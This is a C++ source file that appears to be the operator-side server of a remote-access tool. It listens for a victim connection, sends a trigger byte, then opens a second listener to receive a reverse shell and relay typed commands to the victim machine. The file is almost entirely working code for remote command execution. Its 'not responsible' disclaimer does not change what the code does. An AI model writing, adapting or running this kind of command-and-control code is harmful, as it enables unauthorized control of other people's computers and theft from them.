/*
Author: millybilligan
GitHub: https://github.com/millybilligan
The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
*/
#include "server.h"


void Server::readFromSocket(SOCKET& sock) {
	int iResult;
	char outputBuffer[MAX_OUTPUT_BUFFER];;
	while (true) {
		iResult = recv(sock, outputBuffer, MAX_OUTPUT_BUFFER, 0);
		if (iResult == -1) {
			break;
		}
		if (iResult < 4096)
			outputBuffer[iResult] = '\0';
		if (_strcmpi(inputUser, outputBuffer) == 0) // _strcmpi == _stricmp - Ñomparison in lowercase
			continue;
		cout << outputBuffer;
		fflush(stdout);
	}
}
INT Server::ReverseShell() {
	WSADATA wsadata;
	SOCKET sockServer, sockClient;
	SOCKADDR_IN sin;
	DWORD bytesReadFromPipe;
	int bytesReadFromSock;
	int sinLen = sizeof(SOCKADDR_IN);
	unsigned short port = 3020;

	//Socket Setup
	WSAStartup(MAKEWORD(2, 2), &wsadata);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = 0;
	sin.sin_port = htons(port);

	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	if (sockServer == SOCKET_ERROR)
		return 1;
	int yes = 1;
	setsockopt(sockServer, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
	::bind(sockServer, (SOCKADDR*)&sin, sizeof(sin));
	listen(sockServer, 0);
	sockClient = accept(sockServer, (SOCKADDR*)&sin, &sinLen);

	DWORD thId;
	HANDLE pThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)readFromSocket, &sockClient, NULL, &thId);


	do {
		fgets(inputUser, MAX_INPUT_BUFFER, stdin);
		if (_strcmpi(inputUser, "cls\n") == 0 || _strcmpi(inputUser, "clear\n") == 0) {
			system("cls");
			cout << "$shell>";
			continue;
		}
		send(sockClient, inputUser, strlen(inputUser), NULL);

	} while (_strcmpi(inputUser, "exit\n") != 0);

	closesocket(sockServer);
	closesocket(sockClient);
	WSACleanup();

	return 0;
}
void Server::startConnection() {
	WSAData wsaData;
	WORD DLLVersion = MAKEWORD(2, 1);
	WSAStartup(DLLVersion, &wsaData);

	SOCKADDR_IN addr;
	int sizeofAddr = sizeof(addr);
	addr.sin_addr.S_un.S_addr = INADDR_ANY;
	addr.sin_port = htons(1111);
	addr.sin_family = AF_INET;

	SOCKET sListen = socket(AF_INET, SOCK_STREAM, 0);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));

	listen(sListen, SOMAXCONN);

	SOCKET newConnection;
	newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofAddr);

	if (newConnection != 0) {
		char szResp;
		while (true) {
			char buf;
			cin >> szResp;
			if (szResp == '1') {
				send(newConnection, &szResp, sizeof(szResp), 0);
				ReverseShell();
			}
		}
	}
}

void Server::ping(SOCKET& sock) {
		Sleep(10000);
		char buf;
		char szResp = '?';
		send(sock, &szResp, sizeof(szResp), 0);
		recv(sock, &buf, sizeof(buf), 0);
		if (buf != '!') {
			startConnection();
		}
}

char Server::inputUser[MAX_INPUT_BUFFER];